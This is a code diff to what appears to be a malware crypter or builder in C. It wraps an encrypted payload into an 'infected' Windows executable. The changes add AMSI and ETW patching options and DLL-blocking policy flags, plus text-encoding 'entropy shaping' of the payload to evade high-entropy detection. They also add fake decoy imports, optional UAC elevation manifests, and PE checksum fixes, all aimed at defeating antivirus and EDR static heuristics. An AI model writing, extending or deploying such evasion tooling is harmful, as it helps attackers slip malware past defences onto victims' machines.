@@ -16,12 +16,15 @@
 
 #include <Windows.h>
 #include <wincrypt.h>
+#include <imagehlp.h>
 #include <stdio.h>
 #include <string.h>
 
 /* Our modules */
 #include "..\Engine\Crypto.h"
 #include "..\Engine\Compression.h"
+#include "..\Engine\DecoyImports.h"
+#include "..\Engine\EntropyCodec.h"
 #include "..\Engine\PeBuilder.h"
 #include "..\Engine\MutationEngine.h"
 #include "..\Engine\Xtea.h"
@@ -31,6 +34,7 @@
 #include "UacManifest.h"
 
 #pragma comment(lib, "Crypt32.lib")
+#pragma comment(lib, "imagehlp.lib")
 
 /* Djb2 with caller-supplied seed — seed is key_salt[0] (per-build CryptGenRandom).
  * Eliminates the fixed 0xDEADC0DE constant from both Builder and stub.bin. */
@@ -85,6 +89,8 @@ typedef struct {
 static const DISABLE_ENTRY kDisableMap[] = {
     /* OPSEC technique disable */
     { "etw",       OPSEC_FLAG_NO_ETW,           DGROUP_OPSEC,   "EtwEventWrite patch (ETW telemetry)" },
+    { "amsi",      OPSEC_FLAG_NO_AMSI,          DGROUP_OPSEC,   "AmsiScanBuffer patch (only when amsi.dll already loaded)" },
+    { "blockdlls", OPSEC_FLAG_NO_BLOCKDLLS,     DGROUP_OPSEC,   "ProcessSignaturePolicy MicrosoftSignedOnly (block 3rd-party DLL loads)" },
     { "spoofing",  OPSEC_FLAG_NO_CALLSTACK,     DGROUP_OPSEC,   "Call-stack spoofing (SilentMoonwalk RSP pivot)" },
     { "peb",       OPSEC_FLAG_NO_PEB,           DGROUP_OPSEC,   "PEB path/cmdline spoof" },
     { "tls",       OPSEC_FLAG_NO_TLS,           DGROUP_OPSEC,   "TLS anti-debug callback" },
@@ -643,6 +649,25 @@ int main(int argc, char* argv[]) {
   /* Zero XTEA key from stack — key_salt is still needed for BuildInfectedPE */
   SecureZeroMemory(xteaKey, sizeof(xteaKey));
 
+  /* STEP 8.5: Entropy shaping — map every nibble of the XTEA blob to one of 16
+   * high-frequency lowercase ASCII letters.  A raw XTEA blob sits at ~8 bits/byte
+   * and trips every "high-entropy resource" heuristic; after shaping the .rsrc
+   * payload measures ~4.0 bits/byte over printable text characters.
+   * Cost: 2x resource size.  metadata.blobSize keeps the DECODED size. */
+  printf("[*] Phase 8.5: Entropy shaping (nibble-to-text encoding)...\n");
+  DWORD decodedBlobSize = (DWORD)mutated.totalSize;
+  DWORD encodedSize     = decodedBlobSize * 2;
+  BYTE* encodedBuffer   = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, encodedSize);
+  if (!encodedBuffer) {
+      fprintf(stderr, "[!] ERROR: Failed to allocate entropy-encode buffer.\n");
+      HeapFree(GetProcessHeap(), 0, mutated.pBuffer);
+      HeapFree(GetProcessHeap(), 0, compressedBuffer);
+      return 1;
+  }
+  EntropyEncode(mutated.pBuffer, decodedBlobSize, encodedBuffer);
+  printf("[+] Entropy shaped: %lu -> %lu bytes (alphabet=16, ~4.0 bits/byte)\n",
+         decodedBlobSize, encodedSize);
+
   /* STEP 9: Verify that at least one preset DLL has an executable section
    *           large enough to hold the final payload blob.
    *
@@ -733,8 +758,9 @@ int main(int argc, char* argv[]) {
   printf("[*] Module-stomp preset: DLL pool indices [%u, %u, %u]\n",
          cfg.dll_indices[0], cfg.dll_indices[1], cfg.dll_indices[2]);
   BOOL bBuildOk = BuildInfectedPE(cfg.stubPath, cfg.outputPath,
-                                  mutated.pBuffer, mutated.totalSize,
+                                  encodedBuffer, encodedSize,
                                   rawTargetSize, (DWORD)mutated.stubSize,
+                                  decodedBlobSize,
                                   key_salt, cfg.dll_indices,
                                   exportHash, cfg.exportArg,
                                   cfg.spoofExe,
@@ -744,17 +770,25 @@ int main(int argc, char* argv[]) {
                                   cfg.hammerMs,
                                   cfg.opsecFlags);
 
-  /* STEP 10.5: Optional UAC elevation manifest — must come AFTER BuildInfectedPE (Phase 10)
+  /* STEP 10.5: Manifest — must come AFTER BuildInfectedPE (Phase 10)
    * because Phase 10's BeginUpdateResourceA rewrites .rsrc entirely, erasing anything written
-   * earlier.  Must come BEFORE SignPeWithPfx (Phase 12) so signing covers the manifest bytes. */
-  if (bBuildOk && cfg.uacElevate) {
-      printf("[*] Phase 10.5: Embedding UAC elevation manifest (requireAdministrator)...\n");
-      int uacRes = EmbedUacManifest(cfg.outputPath);
-      if (uacRes != 0) {
-          fprintf(stderr, "[!] UAC manifest embedding failed (code %d)\n", uacRes);
+   * earlier.  Must come BEFORE SignPeWithPfx (Phase 12) so signing covers the manifest bytes.
+   * Every build gets a manifest: requireAdministrator with --uac, asInvoker otherwise —
+   * a total absence of RT_MANIFEST is itself a static anomaly. */
+  if (bBuildOk) {
+      int mRes;
+      if (cfg.uacElevate) {
+          printf("[*] Phase 10.5: Embedding UAC elevation manifest (requireAdministrator)...\n");
+          mRes = EmbedUacManifest(cfg.outputPath);
+      } else {
+          printf("[*] Phase 10.5: Embedding default manifest (asInvoker)...\n");
+          mRes = EmbedDefaultManifest(cfg.outputPath);
+      }
+      if (mRes != 0) {
+          fprintf(stderr, "[!] Manifest embedding failed (code %d)\n", mRes);
           bBuildOk = FALSE;
       } else {
-          printf("[+] UAC elevation manifest embedded\n");
+          printf("[+] Manifest embedded\n");
       }
   }
 
@@ -768,6 +802,33 @@ int main(int argc, char* argv[]) {
       if (cloneRes != 0) {
           fprintf(stderr, "[-] Metadata cloning failed (code %d)\n", cloneRes);
           bBuildOk = FALSE;
+      }
+  }
+
+  /* STEP 11.5: Synthetic decoy import directory — MUST run after the LAST
+   * BeginUpdateResource/EndUpdateResource cycle in the pipeline (Phases 10,
+   * 10.5, 11): UpdateResource relocates sections on .rsrc growth and fixes up
+   * only the RESOURCE and BASERELOC directories — DataDirectory[IMPORT] is
+   * left stale.  Runs before signing (Phase 12) so the signature covers the
+   * final layout.  Soft-skip when a cert table already exists (clone-meta):
+   * appending past it would invalidate the cloned cert blob. */
+  if (bBuildOk) {
+      printf("[*] Phase 11.5: Building decoy import directory...\n");
+      BYTE* pImg = NULL;
+      DWORD imgSize = 0;
+      if (!ReadFileToBuffer(cfg.outputPath, &pImg, &imgSize)) {
+          fprintf(stderr, "[!] DecoyImports: failed to read output file\n");
+          bBuildOk = FALSE;
+      } else {
+          if (DecoyImports_Apply(&pImg, &imgSize)) {
+              if (!WriteBufferToFile(cfg.outputPath, pImg, imgSize)) {
+                  fprintf(stderr, "[!] DecoyImports: failed to write output file\n");
+                  bBuildOk = FALSE;
+              }
+          } else {
+              printf("[!] DecoyImports skipped (cert table present or no section-header room)\n");
+          }
+          HeapFree(GetProcessHeap(), 0, pImg);
       }
   }
 
@@ -786,6 +847,38 @@ int main(int argc, char* argv[]) {
       }
   }
 
+  /* STEP 13: Final PE checksum — always.  StubMorph zeroes CheckSum (a valid but
+   * conspicuous value; legit linked binaries carry a real one).  CloneMeta and
+   * PeSigning already recompute it on their paths — this covers the default path
+   * and is idempotent on the others.
+   * NOTE: MapFileAndCheckSumA only COMPUTES — the value must be written into
+   * OptionalHeader.CheckSum (e_lfanew + 24 + 64) explicitly. */
+  if (bBuildOk) {
+      DWORD headerSum = 0, checkSum = 0;
+      if (MapFileAndCheckSumA(cfg.outputPath, &headerSum, &checkSum) == CHECKSUM_SUCCESS) {
+          HANDLE hF = CreateFileA(cfg.outputPath, GENERIC_READ | GENERIC_WRITE, 0,
+                                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+          if (hF != INVALID_HANDLE_VALUE) {
+              BYTE dosHdr[0x40];
+              DWORD rd = 0, wr = 0;
+              if (ReadFile(hF, dosHdr, sizeof(dosHdr), &rd, NULL) && rd == sizeof(dosHdr)) {
+                  DWORD eLfanew = *(DWORD*)(dosHdr + 0x3C);
+                  if (SetFilePointer(hF, eLfanew + 24 + 64, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER &&
+                      WriteFile(hF, &checkSum, sizeof(checkSum), &wr, NULL) && wr == sizeof(checkSum)) {
+                      printf("[+] Final PE checksum: 0x%08lX\n", checkSum);
+                  } else {
+                      fprintf(stderr, "[!] WARNING: failed to write CheckSum field\n");
+                  }
+              }
+              CloseHandle(hF);
+          } else {
+              fprintf(stderr, "[!] WARNING: CheckSum computed but file reopen failed\n");
+          }
+      } else {
+          fprintf(stderr, "[!] WARNING: MapFileAndCheckSumA failed — CheckSum left as-is\n");
+      }
+  }
+
   if (bBuildOk) {
       printf("\n[+] === You're good to go! Build finished. ===\n");
       printf("[+] Saved as: %s\n", cfg.outputPath);
@@ -800,6 +893,10 @@ int main(int argc, char* argv[]) {
   if (mutated.pBuffer) {
       SecureZeroMemory(mutated.pBuffer, mutated.totalSize);
       HeapFree(GetProcessHeap(), 0, mutated.pBuffer);
+  }
+  if (encodedBuffer) {
+      SecureZeroMemory(encodedBuffer, encodedSize);
+      HeapFree(GetProcessHeap(), 0, encodedBuffer);
   }
   if (compressedBuffer) {
       SecureZeroMemory(compressedBuffer, compressedSize);
